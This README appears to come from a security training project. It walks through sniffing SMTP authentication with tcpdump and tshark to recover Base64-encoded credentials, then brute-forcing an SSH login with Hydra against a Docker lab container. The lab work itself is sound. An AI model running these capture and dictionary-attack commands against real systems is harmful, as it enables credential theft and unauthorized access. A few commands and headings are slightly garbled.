# alx-attack_is_the_best_defense

A repo for the optional project Attack is the best defense
DevOps
Scripting
Hacking

## Task 0: ARP Spoofing and Sniffing Unencrypted Traffic

### Prerequisites

Before proceeding, ensure you have the required tools installed:

1. **Download the Program:**

   - Download the provided program:
     ```bash
     curl -O https://s3.amazonaws.com/intranet-projects-files/holbertonschool-sysadmin_devops/264/user_authenticating_into_server
     ```

2. **Install `tcpdump`:**

   - Update your package list:
     ```bash
     sudo apt-get update
     ```
   - Install `tcpdump`:
     ```bash
     sudo apt-get install tcpdump
     ```

3. **Install `tshark`:**
   - Install `tshark` for more human-readable output:
     ```bash
     sudo apt install tshark
     ```

### Intercepting Data

Now you're ready to intercept data between the `user_authenticating_into_server` program and the SendGrid server.

1. **Run `tcpdump`:**

   - Execute the following command to capture network traffic:
     ```bash
     sudo tcpdump -i eth0 -n -s 0 -A 'host smtp.sendgrid.net and port 587' -w sendgrid_traffic.pcap
     ```
     - `-i eth0`: Replace `eth0` with the network interface your program uses.
     - `-n`: Display numeric IP addresses and port numbers instead of resolving hostnames and services.
     - `-s 0`: Capture the entire packet.
     - `-A`: Display packet data (payload) in ASCII format.
     - `'host smtp.sendgrid.net and port 587'`: Capture traffic to and from SendGrid's SMTP server on port 587.
     - `-w sendgrid_traffic.pcap`: Save captured packets to a file for later analysis.

2. **Run Your Program:**

   - In a second Ubuntu terminal, give permission and then run your program:
     ```bash
     sudo chmod +x user_authenticating_into_server
     sudo ./user_authenticating_into_server
     ```

3. **Capture and Analyze:**
   - Wait for your program to execute, then interrupt the first terminal using `CTRL-C`.
   - You'll have a `sendgrid_traffic.pcap` file that you can analyze.

### Analyzing the Capture

You can analyze the capture file using either `tcpdump` or `tshark`:

- Using `tcpdump`:
  ```bash
  tcpdump -r sendgrid_traffic.pcap
  ```
- Using `tshark` for more human-readable output while your script is running:

  ````bash
  tshark sudo tshark -i wlp108s0
  ```

  ```bash
  15 3.999733 172.31.145.221 → 54.228.39.88 SMTP 80 C: User: bXlsb2dpbg==
  16 4.069955 54.228.39.88 → 172.31.145.221 TCP 66 587 → 57152 [ACK] Seq=196 Ack=63 Win=32256 Len=0 TSval=2327286244 TSecr=1468075274
  17 4.069956 54.228.39.88 → 172.31.145.221 SMTP 84 S: 334 UGFzc3dvcmQ6
  18 4.070087 172.31.145.221 → 54.228.39.88 TCP 66 57152 → 587 [ACK] Seq=63 Ack=214 Win=64128 Len=0 TSval=1468075345 TSecr=2327286244
  19 6.001628 172.31.145.221 → 54.228.39.88 SMTP 88 C: Pass: bXlwYXNzd29yZDk4OTgh
  ````

  This part of the output shows the authentication process with the information:

  User: bXlsb2dpbg==

  Pass: bXlwYXNzd29yZDk4OTgh

  Credentials are [Base64 encoded](https://www.base64decode.org/), so the decoded information would be:

  User: \*\*\*

  Pass: \*\*\*

## Task 1: Dictionary Attack

Performing a dictionary attack using Hydra to guess a password for an SSH account.

## Prerequisites

- Docker: [Install Docker](https://docs.docker.com/get-docker/)

## Setup

1. Pull and run the Docker image `sylvainkalache/264-1` with the following command:

   ```bash
   docker run -p 2222:22 -d -ti sylvainkalache/264-1
   ```

2. Start the Docker container by replacing `<container_id>` with the ID of the newly created `sylvainkalache/264-1` container:

   ```bash
   docker start -ai <container_id>
   ```

3. Install Hydra:

   ```bash
   sudo apt-get install hydra
   ```

4. Download a potential password list in `.txt` format. You can find one in the [SecLists library](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt).
   rockyou.txt

   - [SOURCE 1](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz
   - [SOURCE 2](https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt)

5. To save time and resources, isolate passwords with 11 characters from your password list:

   ```bash
   grep -oE '\b\w{11}\b' all_passwords.txt > 11_char_passwords.txt
   ```

## Running the Attack

Run Hydra with the specified requirements:

```bash
hydra -l sylvain -P 11_char_passwords.txt ssh://127.0.0.1 -t 5
```

- `-l sylvain`: Specifies the target username as "sylvain." This is the username for which you are attempting to guess the password.

- `-P 11_char_passwords.txt`: Specifies the password list or wordlist you are using for the attack. In this case, the wordlist contains passwords with 11 characters. Hydra will try each password from this list in an attempt to gain access to the SSH service.

- `ssh://127.0.0.1`: Specifies the target SSH service running on the local host (127.0.0.1). Hydra will attempt to log in to this SSH service using the provided username and the passwords from the wordlist.

- `-t 5`: This option specifies the number of threads you want to use in parallel for the attack. In this case, you've specified 5 threads

Please practice patience as hydra tries every password in the file until it finds the right one. Once successful, it will return an output similar to:

```bash
[22][ssh] host: 127.0.0.1   login: ***   password: ***
1 of 1 target successfully completed, 1 valid password found
```
